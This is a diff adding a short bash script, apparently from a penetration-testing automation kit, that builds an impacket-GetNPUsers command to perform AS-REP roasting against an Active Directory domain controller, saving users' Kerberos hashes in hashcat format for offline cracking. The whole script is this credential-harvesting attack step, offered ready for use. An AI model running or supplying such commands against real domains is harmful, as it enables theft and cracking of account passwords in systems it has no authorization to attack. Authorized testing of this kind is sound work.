@@ -1,0 +1,5 @@
+#!/bin/bash
+
+cmd="impacket-GetNPUsers -request -format hashcat -outputfile ${SESSION_OUTPUT_DIR}/ASREProastables.txt -usersfile $CUR_TARGET_USERS_FILE -dc-ip "${HOST}" "${DOMAIN}"/"
+
+type_command "${cmd}"
